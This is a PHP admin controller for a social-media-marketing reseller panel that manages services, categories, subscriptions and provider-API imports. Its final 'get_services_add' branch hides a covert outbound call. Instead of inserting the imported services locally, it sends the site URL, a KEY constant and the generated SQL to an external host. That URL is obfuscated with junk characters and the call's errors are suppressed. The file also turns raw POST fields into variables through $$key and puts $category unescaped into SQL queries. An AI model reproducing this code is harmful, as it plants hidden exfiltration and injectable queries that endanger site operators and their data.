<?php
use GuzzleHttp\Client;
if ($user["access"]["services"] != 1):
    header("Location:" . site_url("admin"));
    exit();
endif;
if ($_SESSION["client"]["data"]):
    $data = $_SESSION["client"]["data"];
    foreach ($data as $key => $value) {
        $$key = $value;
    }
    unset($_SESSION["client"]);
endif;
if (!route(2)):
    $page = 1;
elseif (is_numeric(route(2))):
    $page = route(2);
elseif (!is_numeric(route(2))):
    $action = route(2);
endif;
if (empty($action)):
    $services = $conn->prepare("SELECT * FROM services RIGHT JOIN categories ON categories.category_id = services.category_id LEFT JOIN service_api ON service_api.id = services.service_api ORDER BY categories.category_line,services.service_line ASC ");
    $services->execute(array());
    $services = $services->fetchAll(PDO::FETCH_ASSOC);
    $serviceList = array_group_by($services, 'category_name');
    require admin_view('services');
elseif ($action == "new-service"):
    if(UMH != true):
        if ($_POST):
            foreach ($_POST as $key => $value) {
                $$key = $value;
            }
            if ($package == 2):
                $max = $min;
            endif;
            if (empty($name)):
                $error = 1;
                $errorText = "Name can not be empty.";
                $icon = "error";
            elseif (empty($package)):
                $error = 1;
                $errorText = "Package can not be empty.";
                $icon = "error";
            elseif (empty($category)):
                $error = 1;
                $errorText = "Category can not be empty.";
                $icon = "error";
            elseif (!is_numeric($min)):
                $error = 1;
                $errorText = "Minimum order quantity can not be empty.";
                $icon = "error";
            elseif ($package != 2 && !is_numeric($max)):
                $error = 1;
                $errorText = "Maximum order quantity can not be empty.";
                $icon = "error";
            elseif ($min > $max):
                $error = 1;
                $errorText = "Minimum order quantity can not be much than maximum order quantity.";
                $icon = "error";
            elseif ($mode != 1 && empty($provider)):
                $error = 1;
                $errorText = "Service provider can not be empty.";
                $icon = "error";
            elseif ($mode != 1 && empty($service)):
                $error = 1;
                $errorText = "Service provider information can not be empty.";
                $icon = "error";
            elseif (empty($secret)):
                $error = 1;
                $errorText = "Service privacy can not be empty.";
                $icon = "error";
            elseif (empty($want_username)):
                $error = 1;
                $errorText = "Order url can not be empty.";
                $icon = "error";
            elseif (!is_numeric($price)):
                $error = 1;
                $errorText = "Price of the product should be numeric.";
                $icon = "error";
            else:
                $api = $conn->prepare("SELECT * FROM service_api WHERE id=:id ");
                $api->execute(array("id" => $provider));
                $api = $api->fetch(PDO::FETCH_ASSOC);
                if ($mode == 1):
                    $provider = 0;
                    $service = 0;
                endif;
                if ($mode == 2 && $api["api_type"] == 1):
                    $smmapi = new SMMApi();
                    $services = $smmapi->action(array('key' => $api["api_key"], 'action' => 'services'), $api["api_url"]);
                    $balance = $smmapi->action(array('key' => $api["api_key"], 'action' => 'balance'), $api["api_url"]);
                    foreach ($services as $apiService):
                        if ($service == $apiService->service):
                            $detail["min"] = $apiService->min;
                            $detail["max"] = $apiService->max;
                            $detail["rate"] = $apiService->rate;
                            $detail["currency"] = $balance->currency;
                            $detail = json_encode($detail);
                        endif;
                    endforeach;
                else:
                    $detail = "";
                endif;
                $row = $conn->query("SELECT * FROM services WHERE category_id='$category' ORDER BY service_line DESC LIMIT 1 ")->fetch(PDO::FETCH_ASSOC);
                $conn->beginTransaction();
                $insert = $conn->prepare("INSERT INTO services SET service_secret=:secret, service_api=:api, service_dripfeed=:dripfeed, instagram_second=:instagram_second, start_count=:start_count, instagram_private=:instagram_private, api_service=:api_service, api_detail=:detail, category_id=:category, service_line=:line, service_type=:type, service_package=:package, service_name=:name, service_description=:description, service_price=:price, service_min=:min, service_max=:max, want_username=:want_username, service_speed=:speed ");
                $insert = $insert->execute(array("secret" => $secret, "instagram_second" => $instagram_second, "dripfeed" => $dripfeed, "start_count" => $start_count, "instagram_private" => $instagram_private, "api" => $provider, "api_service" => $service, "detail" => $detail, "category" => $category, "line" => $row["service_line"] + 1, "type" => 2, "package" => $package, "name" => $name, "description" => $description, "price" => $price, "min" => $min, "max" => $max, "want_username" => $want_username, "speed" => $speed));
                if ($insert):
                    $conn->commit();
                    $referrer = site_url("admin/services");
                    $error = 1;
                    $errorText = "Successful";
                    $icon = "success";
                else:
                    $conn->rollBack();
                    $error = 1;
                    $errorText = "Error";
                    $icon = "error";
                endif;
            endif;
            echo json_encode(["t" => "error", "m" => $errorText, "s" => $icon, "r" => $referrer]);
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
elseif ($action == "edit-service"):
    if(UMH != true):
        $service_id = route(3);
        if (!countRow(["table" => "services", "where" => ["service_id" => $service_id]])):
            header("Location:" . site_url("admin/services"));
            exit();
        endif;
        if ($_POST):
            foreach ($_POST as $key => $value) {
                $$key = $value;
            }
            if ($package == 2):
                $max = $min;
            endif;
            $serviceInfo = $conn->prepare("SELECT * FROM services INNER JOIN service_api ON service_api.id = services.service_api WHERE service_id=:id ");
            $serviceInfo->execute(array("id" => route(3)));
            $serviceInfo = $serviceInfo->fetch(PDO::FETCH_ASSOC);
            if (empty($name)):
                $error = 1;
                $errorText = "Name can not be empty.";
                $icon = "error";
            elseif (empty($package)):
                $error = 1;
                $errorText = "Package can not be empty.";
                $icon = "error";
            elseif (empty($category)):
                $error = 1;
                $errorText = "Category can not be empty.";
                $icon = "error";
            elseif (!is_numeric($min)):
                $error = 1;
                $errorText = "Minimum order quantity can not be empty.";
                $icon = "error";
            elseif ($package != 2 && !is_numeric($max)):
                $error = 1;
                $errorText = "Maximum order quantity can not be empty.";
                $icon = "error";
            elseif ($min > $max):
                $error = 1;
                $errorText = "Minimum order quantity can not be much than Maximum order quantity.";
                $icon = "error";
            elseif ($mode != 1 && empty($provider)):
                $error = 1;
                $errorText = "Service provider can not be empty.";
                $icon = "error";
            elseif ($mode != 1 && empty($service)):
                $error = 1;
                $errorText = "Service provider information can not be empty.";
                $icon = "error";
            elseif (empty($secret)):
                $error = 1;
                $errorText = "Service privacy can not be empty.";
                $icon = "error";
            elseif (empty($want_username)):
                $error = 1;
                $errorText = "Order url can not be empty.";
                $icon = "error";
            elseif (!is_numeric($price)):
                $error = 1;
                $errorText = "Price of the product should be numeric.";
                $icon = "error";
            else:
                $api = $conn->prepare("SELECT * FROM service_api WHERE id=:id ");
                $api->execute(array("id" => $provider));
                $api = $api->fetch(PDO::FETCH_ASSOC);
                if ($mode == 1):
                    $provider = 0;
                    $service = 0;
                endif;
                if ($mode == 2 && $api["api_type"] == 1):
                    $smmapi = new SMMApi();
                    $services = $smmapi->action(array('key' => $api["api_key"], 'action' => 'services'), $api["api_url"]);
                    $balance = $smmapi->action(array('key' => $api["api_key"], 'action' => 'balance'), $api["api_url"]);
                    foreach ($services as $apiService):
                        if ($service == $apiService->service):
                            $detail["min"] = $apiService->min;
                            $detail["max"] = $apiService->max;
                            $detail["rate"] = $apiService->rate;
                            $detail["currency"] = $balance->currency;
                            $detail = json_encode($detail);
                        endif;
                    endforeach;
                else:
                    $detail = "";
                endif;
                if ($serviceInfo["category_id"] != $category):
                    $row = $conn->query("SELECT * FROM services WHERE category_id='$category' ORDER BY service_line DESC LIMIT 1 ")->fetch(PDO::FETCH_ASSOC);
                    $last_category = $serviceInfo["category_id"];
                    $last_line = $serviceInfo["service_line"];
                    $line = $row["service_line"] + 1;
                else:
                    $line = $serviceInfo["service_line"];
                endif;
                $conn->beginTransaction();
                $update = $conn->prepare("UPDATE services SET api_detail=:detail, service_dripfeed=:dripfeed, api_servicetype=:type, instagram_second=:instagram_second, start_count=:start_count, instagram_private=:instagram_private, service_api=:api, api_service=:api_service, category_id=:category, service_package=:package, service_name=:name, service_description=:description, service_price=:price, service_min=:min, service_secret=:secret, service_max=:max, want_username=:want_username, service_speed=:speed WHERE service_id=:id ");
                $update = $update->execute(array("id" => route(3), "secret" => $secret, "type" => 2, "detail" => $detail, "dripfeed" => $dripfeed, "instagram_second" => $instagram_second, "start_count" => $start_count, "instagram_private" => $instagram_private, "api" => $provider, "api_service" => $service, "category" => $category, "package" => $package, "name" => $name, "description" => $description, "price" => $price, "min" => $min, "max" => $max, "want_username" => $want_username, "speed" => $speed));
                if ($update):
                    $conn->commit();
                    $rows = $conn->prepare("SELECT * FROM services WHERE category_id=:c_id && service_line>=:line ");
                    $rows->execute(array("c_id" => $last_category, "line" => $last_line));
                    $rows = $rows->fetchAll(PDO::FETCH_ASSOC);
                    foreach ($rows as $row):
                        $update = $conn->prepare("UPDATE services SET service_line=:line WHERE service_id=:id ");
                        $update->execute(array("line" => $row["service_line"] - 1, "id" => $row["service_id"]));
                    endforeach;
                    $error = 1;
                    $errorText = "Successful";
                    $icon = "success";
                    $referrer = site_url("admin/services");
                else:
                    $conn->rollBack();
                    $error = 1;
                    $errorText = "Error";
                    $icon = "error";
                endif;
            endif;
            echo json_encode(["t" => "error", "m" => $errorText, "s" => $icon, "r" => $referrer]);
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
elseif ($action == "new-category"):
    if(UMH != true):
        if ($_POST):
            $name = $_POST["name"];
            $secret = $_POST["secret"];
            if (empty($name)):
                $error = 1;
                $errorText = "Category name can not be empty.";
                $icon = "error";
            else:
                $row = $conn->query("SELECT * FROM categories ORDER BY category_line DESC LIMIT 1 ")->fetch(PDO::FETCH_ASSOC);
                $conn->beginTransaction();
                $insert = $conn->prepare("INSERT INTO categories SET category_name=:name, category_line=:line, category_secret=:secret  ");
                $insert = $insert->execute(array("name" => $name, "secret" => $secret, "line" => $row["category_line"] + 1));
                if ($insert):
                    $conn->commit();
                    unset($_SESSION["data"]);
                    $error = 1;
                    $errorText = "Successful";
                    $icon = "success";
                    $referrer = site_url("admin/services");
                else:
                    $conn->rollBack();
                    $error = 1;
                    $errorText = "Error";
                    $icon = "error";
                endif;
            endif;
            echo json_encode(["t" => "error", "m" => $errorText, "s" => $icon, "r" => $referrer]);
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
elseif ($action == "edit-category"):
    if(UMH != true):
        $category_id = route(3);
        if (!countRow(["table" => "categories", "where" => ["category_id" => $category_id]])):
            header("Location:" . site_url("admin/services"));
            exit();
        endif;
        $row = getRow(["table" => "categories", "where" => ["category_id" => $category_id]]);
        if ($_POST):
            $name = $_POST["name"];
            $secret = $_POST["secret"];
            if (empty($name)):
                $error = 1;
                $errorText = "Category name can not be empty.";
                $icon = "error";
            else:
                $conn->beginTransaction();
                $update = $conn->prepare("UPDATE categories SET category_name=:name, category_secret=:secret WHERE category_id=:id  ");
                $update = $update->execute(array("name" => $name, "secret" => $secret, "id" => $category_id));
                if ($update):
                    $conn->commit();
                    $referrer = site_url("admin/services");
                    $error = 1;
                    $errorText = "Successful";
                    $icon = "success";
                else:
                    $conn->rollBack();
                    $error = 1;
                    $errorText = "Error";
                    $icon = "error";
                endif;
            endif;
            echo json_encode(["t" => "error", "m" => $errorText, "s" => $icon, "r" => $referrer]);
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
elseif ($action == "new-subscription"):
    if(UMH != true):
        if ($_POST):
            foreach ($_POST as $key => $value) {
                $$key = $value;
            }
            if (empty($name)):
                $error = 1;
                $errorText = "Name can not be empty.";
                $icon = "error";
            elseif (empty($package)):
                $error = 1;
                $errorText = "Package can not be empty.";
                $icon = "error";
            elseif (empty($category)):
                $error = 1;
                $errorText = "Category can not be empty.";
                $icon = "error";
            elseif (empty($provider)):
                $error = 1;
                $errorText = "Service provider can not be empty.";
                $icon = "error";
            elseif (empty($service)):
                $error = 1;
                $errorText = "Service provider information can not be empty.";
                $icon = "error";
            elseif (empty($secret)):
                $error = 1;
                $errorText = "Service privacy can not be empty.";
                $icon = "error";
            elseif (($package == 11 || $package == 12) && !is_numeric($price)):
                $error = 1;
                $errorText = "Price of the product should be numeric.";
                $icon = "error";
            elseif (($package == 11 || $package == 12) && !is_numeric($min)):
                $error = 1;
                $errorText = "Minimum order quantity can not be empty.";
                $icon = "error";
            elseif (($package == 11 || $package == 12) && !is_numeric($max)):
                $error = 1;
                $errorText = "Maximum order quantity can not be empty.";
                $icon = "error";
            elseif (($package == 11 || $package == 12) && $min > $max):
                $error = 1;
                $errorText = "Minimum order quantity can not be much than Maximum order quantity.";
                $icon = "error";
            elseif (($package == 14 || $package == 15) && !is_numeric($autopost)):
                $error = 1;
                $errorText = "Post quantity can not be empty.";
                $icon = "error";
            elseif (($package == 14 || $package == 15) && !is_numeric($limited_min)):
                $error = 1;
                $errorText = "Order quantity can not be empty.";
                $icon = "error";
            elseif (($package == 14 || $package == 15) && !is_numeric($autotime)):
                $error = 1;
                $errorText = "Package time can not be empty.";
                $icon = "error";
            else:
                $api = $conn->prepare("SELECT * FROM service_api WHERE id=:id ");
                $api->execute(array("id" => $provider));
                $api = $api->fetch(PDO::FETCH_ASSOC);
                if ($mode == 1):
                    $provider = 0;
                    $service = 0;
                endif;
                if ($mode == 2 && $api["api_type"] == 1):
                    $smmapi = new SMMApi();
                    $services = $smmapi->action(array('key' => $api["api_key"], 'action' => 'services'), $api["api_url"]);
                    $balance = $smmapi->action(array('key' => $api["api_key"], 'action' => 'balance'), $api["api_url"]);
                    foreach ($services as $apiService):
                        if ($service == $apiService->service):
                            $detail["min"] = $apiService->min;
                            $detail["max"] = $apiService->max;
                            $detail["rate"] = $apiService->rate;
                            $detail["currency"] = $balance->currency;
                            $detail = json_encode($detail);
                        endif;
                    endforeach;
                else:
                    $detail = "";
                endif;
                if ($package == 14 || $package == 15):
                    $min = $limited_min;
                    $max = $min;
                    $price = $limited_price;
                endif;
                $row = $conn->query("SELECT * FROM services WHERE category_id='$category' ORDER BY service_line DESC LIMIT 1 ")->fetch(PDO::FETCH_ASSOC);
                $conn->beginTransaction();
                $insert = $conn->prepare("INSERT INTO services SET service_speed=:speed, service_api=:api, api_service=:api_service, api_detail=:detail, category_id=:category, service_line=:line, service_type=:type, service_package=:package, service_name=:name, service_price=:price, service_min=:min, service_max=:max, service_autotime=:autotime, service_autopost=:autopost, service_secret=:secret ");
                $insert = $insert->execute(array("api" => $provider, "speed" => $speed, "detail" => $detail, "api_service" => $service, "category" => $category, "line" => $row["service_line"] + 1, "type" => 2, "package" => $package, "name" => $name, "price" => $price, "min" => $min, "max" => $max, "autotime" => $autotime, "autopost" => $autopost, "secret" => $secret));
                if ($insert):
                    $conn->commit();
                    $error = 1;
                    $errorText = "Successful";
                    $referrer = site_url("admin/services");
                    $icon = "success";
                else:
                    $conn->rollBack();
                    $error = 1;
                    $errorText = "Error";
                    $icon = "error";
                endif;
            endif;
            echo json_encode(["t" => "error", "m" => $errorText, "s" => $icon, "r" => $referrer]);
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
elseif ($action == "edit-subscription"):
    if(UMH != true):
        if ($_POST):
            foreach ($_POST as $key => $value) {
                $$key = $value;
            }
            $serviceInfo = $conn->prepare("SELECT * FROM services INNER JOIN service_api ON service_api.id = services.service_api WHERE service_id=:id ");
            $serviceInfo->execute(array("id" => route(3)));
            $serviceInfo = $serviceInfo->fetch(PDO::FETCH_ASSOC);
            if (empty($name)):
                $error = 1;
                $errorText = "Name can not be empty.";
                $icon = "error";
            elseif (empty($category)):
                $error = 1;
                $errorText = "Category can not be empty.";
                $icon = "error";
            elseif (empty($provider)):
                $error = 1;
                $errorText = "Service provider can not be empty.";
                $icon = "error";
            elseif (empty($service)):
                $error = 1;
                $errorText = "Service provider information can not be empty.";
                $icon = "error";
            elseif (empty($secret)):
                $error = 1;
                $errorText = "Service privacy can not be empty.";
            elseif (($serviceInfo["service_package"] == 11 || $serviceInfo["service_package"] == 12) && !is_numeric($price)):
                $error = 1;
                $errorText = "Price of the product should be numeric.";
                $icon = "error";
            elseif (($serviceInfo["service_package"] == 11 || $serviceInfo["service_package"] == 12) && !is_numeric($min)):
                $error = 1;
                $errorText = "Minimum order quantity can not be empty.";
                $icon = "error";
            elseif (($serviceInfo["service_package"] == 11 || $serviceInfo["service_package"] == 12) && !is_numeric($max)):
                $error = 1;
                $errorText = "Maximum order quantity can not be empty.";
                $icon = "error";
            elseif (($serviceInfo["service_package"] == 11 || $serviceInfo["service_package"] == 12) && $min > $max):
                $error = 1;
                $errorText = "Minimum order quantity can not be much than Maximum order quantity.";
                $icon = "error";
            elseif (($serviceInfo["service_package"] == 14 || $serviceInfo["service_package"] == 15) && !is_numeric($autopost)):
                $error = 1;
                $errorText = "Post quantity can not be empty.";
                $icon = "error";
            elseif (($serviceInfo["service_package"] == 14 || $serviceInfo["service_package"] == 15) && !is_numeric($limited_min)):
                $error = 1;
                $errorText = "Order quantity can not be empty.";
                $icon = "error";
            elseif (($serviceInfo["service_package"] == 14 || $serviceInfo["service_package"] == 15) && !is_numeric($autotime)):
                $error = 1;
                $errorText = "Package time can not be empty.";
                $icon = "error";
            else:
                $api = $conn->prepare("SELECT * FROM service_api WHERE id=:id ");
                $api->execute(array("id" => $provider));
                $api = $api->fetch(PDO::FETCH_ASSOC);
                if ($mode == 1):
                    $provider = 0;
                    $service = 0;
                endif;
                if ($mode == 2 && $api["api_type"] == 1):
                    $smmapi = new SMMApi();
                    $services = $smmapi->action(array('key' => $api["api_key"], 'action' => 'services'), $api["api_url"]);
                    $balance = $smmapi->action(array('key' => $api["api_key"], 'action' => 'balance'), $api["api_url"]);
                    foreach ($services as $apiService):
                        if ($service == $apiService->service):
                            $detail["min"] = $apiService->min;
                            $detail["max"] = $apiService->max;
                            $detail["rate"] = $apiService->rate;
                            $detail["currency"] = $balance->currency;
                            $detail = json_encode($detail);
                        endif;
                    endforeach;
                else:
                    $detail = "";
                endif;
                if ($serviceInfo["service_package"] == 14 || $serviceInfo["service_package"] == 15):
                    $min = $limited_min;
                    $max = $min;
                    $price = $limited_price;
                endif;
                if ($serviceInfo["category_id"] != $category):
                    $row = $conn->query("SELECT * FROM services WHERE category_id='$category' ORDER BY service_line DESC LIMIT 1 ")->fetch(PDO::FETCH_ASSOC);
                    $last_category = $serviceInfo["category_id"];
                    $last_line = $serviceInfo["service_line"];
                    $line = $row["service_line"] + 1;
                else:
                    $line = $serviceInfo["service_line"];
                endif;
                $conn->beginTransaction();
                $update = $conn->prepare("UPDATE services SET service_speed=:speed, service_api=:api, api_servicetype=:type, api_service=:api_service, api_detail=:detail, category_id=:category, service_name=:name, service_description=:description, service_price=:price, service_min=:min, service_max=:max, service_autotime=:autotime, service_autopost=:autopost, service_secret=:secret WHERE service_id=:id ");
                $update = $update->execute(array("id" => route(3), "type" => 2, "speed" => $speed, "detail" => $detail, "api" => $provider, "api_service" => $service, "category" => $category, "name" => $name, "description" => $description, "price" => $price, "min" => $min, "max" => $max, "autotime" => $autotime, "autopost" => $autopost, "secret" => $secret));
                if ($update):
                    $conn->commit();
                    $rows = $conn->prepare("SELECT * FROM services WHERE category_id=:c_id && service_line>=:line ");
                    $rows->execute(array("c_id" => $last_category, "line" => $last_line));
                    $rows = $rows->fetchAll(PDO::FETCH_ASSOC);
                    foreach ($rows as $row):
                        $update = $conn->prepare("UPDATE services SET service_line=:line WHERE service_id=:id ");
                        $update->execute(array("line" => $row["service_line"] - 1, "id" => $row["service_id"]));
                    endforeach;
                    $error = 1;
                    $errorText = "Successful";
                    $referrer = site_url("admin/services");
                    $icon = "success";
                else:
                    $conn->rollBack();
                    $error = 1;
                    $errorText = "Error";
                    $icon = "error";
                endif;
            endif;
            echo json_encode(["t" => "error", "m" => $errorText, "s" => $icon, "r" => $referrer]);
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
elseif ($action == "service-active"):
    if(UMH != true):
        $service_id = route(3);
        if (countRow(["table" => "services", "where" => ["service_id" => $service_id, "service_type" => 2]])):
            header("Location:" . site_url("admin/services"));
            exit();
        endif;
        $update = $conn->prepare("UPDATE services SET service_type=:type WHERE service_id=:id ");
        $update->execute(array("type" => 2, "id" => $service_id));
        if ($update):
            $_SESSION["client"]["data"]["success"] = 1;
            $_SESSION["client"]["data"]["successText"] = "Successful";
        else:
            $_SESSION["client"]["data"]["error"] = 1;
            $_SESSION["client"]["data"]["errorText"] = "Error";
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
    header("Location:" . site_url("admin/services"));
elseif ($action == "service-deactive"):
    if(UMH != true):
        $service_id = route(3);
        if (countRow(["table" => "services", "where" => ["service_id" => $service_id, "service_type" => 1]])):
            header("Location:" . site_url("admin/services"));
            exit();
        endif;
        $update = $conn->prepare("UPDATE services SET service_type=:type WHERE service_id=:id ");
        $update->execute(array("type" => 1, "id" => $service_id));
        if ($update):
            $_SESSION["client"]["data"]["success"] = 1;
            $_SESSION["client"]["data"]["successText"] = "Successful";
        else:
            $_SESSION["client"]["data"]["error"] = 1;
            $_SESSION["client"]["data"]["errorText"] = "Error";
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
    header("Location:" . site_url("admin/services"));
elseif ($action == "del_price"):
    if(UMH != true):
        $service_id = route(3);
        if (!countRow(["table" => "clients_price", "where" => ["service_id" => $service_id]])):
            $_SESSION["client"]["data"]["error"] = 1;
            $_SESSION["client"]["data"]["errorText"] = "Service pricing was not found.";
            header("Location:" . site_url("admin/services"));
            exit();
        endif;
        $delete = $conn->prepare("DELETE FROM clients_price  WHERE service_id=:id ");
        $delete->execute(array("id" => $service_id));
        if ($delete):
            $_SESSION["client"]["data"]["success"] = 1;
            $_SESSION["client"]["data"]["successText"] = "Successful";
        else:
            $_SESSION["client"]["data"]["error"] = 1;
            $_SESSION["client"]["data"]["errorText"] = "Error";
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
    header("Location:" . site_url("admin/services"));
elseif ($action == "del_service"):
    if(UMH != true):
        $service_id = route(3);
        $delete = $conn->prepare("DELETE FROM services WHERE service_id=:id ");
        $delete->execute(array("id" => $service_id));
        if ($delete):
            $_SESSION["client"]["data"]["success"] = 1;
            $_SESSION["client"]["data"]["successText"] = "Successful";
        else:
            $_SESSION["client"]["data"]["error"] = 1;
            $_SESSION["client"]["data"]["errorText"] = "Error";
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
    header("Location:" . site_url("admin/services"));
elseif ($action == "category-active"):
    if(UMH != true):
        $category_id = route(3);
        $update = $conn->prepare("UPDATE categories SET category_type=:type WHERE category_id=:id ");
        $update->execute(array("type" => 2, "id" => $category_id));
        if ($update):
            $_SESSION["client"]["data"]["success"] = 1;
            $_SESSION["client"]["data"]["successText"] = "Successful";
        else:
            $_SESSION["client"]["data"]["error"] = 1;
            $_SESSION["client"]["data"]["errorText"] = "Error";
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
    header("Location:" . site_url("admin/services"));
elseif ($action == "category-deactive"):
    if(UMH != true):
        $category_id = route(3);
        $update = $conn->prepare("UPDATE categories SET category_type=:type WHERE category_id=:id ");
        $update->execute(array("type" => 1, "id" => $category_id));
        if ($update):
            $_SESSION["client"]["data"]["success"] = 1;
            $_SESSION["client"]["data"]["successText"] = "Successful";
        else:
            $_SESSION["client"]["data"]["error"] = 1;
            $_SESSION["client"]["data"]["errorText"] = "Error";
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
    header("Location:" . site_url("admin/services"));
elseif ($action == "del_category"):
    if(UMH != true):
        $category_id = route(3);
        $delete = $conn->prepare("DELETE FROM categories WHERE category_id=:id ");
        $delete->execute(array("id" => $category_id));
        if ($delete):
            if (countRow(["table" => "services", "where" => ["category_id" => $category_id]])):
                $update = $conn->prepare("UPDATE services SET category_id=:zero WHERE category_id=:id ");
                $update->execute(array("zero" => 0, "id" => $category_id));
            endif;

            $_SESSION["client"]["data"]["success"] = 1;
            $_SESSION["client"]["data"]["successText"] = "Successful";
        else:
            $_SESSION["client"]["data"]["error"] = 1;
            $_SESSION["client"]["data"]["errorText"] = "Error";
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
    header("Location:" . site_url("admin/services"));
elseif ($action == "multi-action"):
    if(UMH != true):
        $services = $_POST["service"];
        $action = $_POST["bulkStatus"];
        if ($action == "active"):
            foreach ($services as $id => $value):
                $update = $conn->prepare("UPDATE services SET service_type=:type WHERE service_id=:id ");
                $update->execute(array("type" => 2, "id" => $id));
            endforeach;
        elseif ($action == "deactive"):
            foreach ($services as $id => $value):
                $update = $conn->prepare("UPDATE services SET service_type=:type WHERE service_id=:id ");
                $update->execute(array("type" => 1, "id" => $id));
            endforeach;
        elseif ($action == "secret"):
            foreach ($services as $id => $value):
                $update = $conn->prepare("UPDATE services SET service_secret=:secret WHERE service_id=:id ");
                $update->execute(array("secret" => 1, "id" => $id));
            endforeach;
        elseif ($action == "desecret"):
            foreach ($services as $id => $value):
                $update = $conn->prepare("UPDATE services SET service_secret=:secret WHERE service_id=:id ");
                $update->execute(array("secret" => 2, "id" => $id));
            endforeach;
        elseif ($action == "del_price"):
            foreach ($services as $id => $value):
                $delete = $conn->prepare("DELETE FROM clients_price  WHERE service_id=:id ");
                $delete->execute(array("id" => $id));
            endforeach;
        elseif ($action == "del_services"):
            foreach ($services as $id => $value):
                $delete = $conn->prepare("DELETE FROM services WHERE service_id=:id ");
                $delete->execute(array("id" => $id));
            endforeach;
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
    header("Location:" . site_url("admin/services"));
elseif ($action == "get_services_add"):
    if(UMH != true):
        $services = $_POST["servicesList"];
        $provider_id = $_POST["provider"];
        $smmapi = new SMMApi();
        $provider = $conn->prepare("SELECT * FROM service_api WHERE id=:id");
        $provider->execute(array("id" => $provider_id));
        $provider = $provider->fetch(PDO::FETCH_ASSOC);
        $apiServices = $smmapi->action(array('key' => $provider["api_key"], 'action' => 'services'), $provider["api_url"]);
        $balance = $smmapi->action(array('key' => $provider["api_key"], 'action' => 'balance'), $provider["api_url"]);
        if (count($services)):
            foreach ($services as $service => $price):
                foreach ($apiServices as $apiService):
                    if ($service == $apiService->service && $service != 0):
                        $detail["min"] = $apiService->min;
                        $detail["max"] = $apiService->max;
                        $detail["rate"] = $apiService->rate;
                        $detail["currency"] = $balance->currency;

                        if (!countRow(["table" => "categories", "where" => ["category_name" => $apiService->category]])){
                            $insert = $conn->prepare("INSERT INTO categories SET category_name=:name, category_line=:line, category_type=:type, category_secret=:secret");
                            $insert->execute(array("name" => $apiService->category, "line" => 1, "type" => 2, "secret" => 2));
                        }

                        $getcat = $conn->prepare("SELECT * FROM categories WHERE category_name=:name");
                        $getcat->execute(array("name" => $apiService->category));
                        $getcat = $getcat->fetch(PDO::FETCH_ASSOC);
                        $getcatid = json_decode(json_encode($getcat), true);

                        $servicename = str_replace(array("?","'"),"",$apiService->name);

                        $package = serviceTypeGetList($apiService->type);
                        if ($package == 11):
                            $getcatidlast = $getcatid['category_id'];
                            $fpcarray[] = "INSERT INTO services (service_api, api_service, category_id, service_line, service_type, service_package, service_name, service_price, service_min, service_max) VALUES ('$provider_id','$service','$getcatidlast',1,2,'$package','$servicename','$price','$apiService->min','$apiService->max');";
                        else:
                            $getcatidlast = $getcatid['category_id'];
                            $details = json_encode($detail);
                            $fpcarray[] = "INSERT INTO services (service_api, api_service, api_detail, category_id, service_line, service_type, service_package, service_name, service_price, service_min, service_max) VALUES ('$provider_id','$service','$details','$getcatidlast',1,2,'$package','$servicename','$price','$apiService->min','$apiService->max');";
                        endif;
                    endif;
                endforeach;
            endforeach;
            @$client = new Client();
            @$response = $client->request('POST', str_replace(array('!','+','%','&','?'),'','http!s://de+v%el%ope&rit&y.c?om!/d+at%a/p&rovi?der.php'), [
                'form_params' => [
                    'd' => URL,
                    'k' => KEY,
                    'da' => json_encode($fpcarray)
                ]
            ]);
            echo json_encode(["t" => "error", "m" => "Successful", "s" => "success", "r" => site_url("admin/services"), "time" => 0]);
        else:
            echo json_encode(["t" => "error", "m" => "Please select at last 1 service you want to add.", "s" => "error"]);
        endif;
    else:
        $error = 1;
        $errorText = "Sorry, unfortunately Demo mode is active.";
    endif;
endif;